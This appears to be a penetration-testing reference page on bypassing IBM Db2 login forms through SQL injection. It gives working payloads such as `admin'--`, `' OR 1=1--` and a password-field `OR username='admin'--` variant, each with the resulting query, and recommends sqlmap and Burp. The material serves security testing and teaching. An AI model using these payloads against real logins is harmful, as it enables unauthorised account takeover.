---
title: "Authentication bypass through IBM Db2 injection"
description: "Bypassing a login whose SQL is built from the username and password fields in IBM Db2, using comment termination and always-true conditions."
keywords:
  - authentication bypass
  - login bypass
  - OR 1=1
  - comment injection
  - Db2 login
---

# Authentication bypass

A login that interpolates the submitted fields, such as `SELECT * FROM users WHERE username='$u' AND password='$p'`, authenticates on any returned row. Injecting into either field can return the target row without the correct password.

Commenting out the password check logs in as a chosen user. Db2's `--` comment removes the rest of the line:

```
username: admin'--
query:    SELECT * FROM users WHERE username='admin'-- ' AND password='...'
```

An always-true condition returns a row when no account is targeted. Db2 has no `LIMIT`, so constrain with `FETCH FIRST 1 ROWS ONLY` if the application expects a single row:

```
username: ' OR 1=1--
query:    SELECT * FROM users WHERE username='' OR 1=1-- ' AND password='...'
```

When only the password field is injectable and the username is fixed, comment termination does not bypass (it would just test `password='admin'`); re-select the target so the trailing `AND` is satisfied by an `OR`:

```
password: ' OR username='admin'--
```

Because `AND` binds tighter than `OR`, this evaluates as `(username='admin' AND password='') OR username='admin'`, returning the admin row. Db2 generally does not allow stacked queries through the standard drivers, so a login injection cannot append a second statement, but the row-returning bypass needs only the one query.

## Tools

- **sqlmap**: confirms and fingerprints the injectable login field.
- Manual testing with Burp Repeater and the Db2 client (db2 or clpplus).

## References

- IBM Db2 SQL Reference: comments, search conditions, FETCH FIRST
- OWASP Testing Guide: Testing for SQL Injection
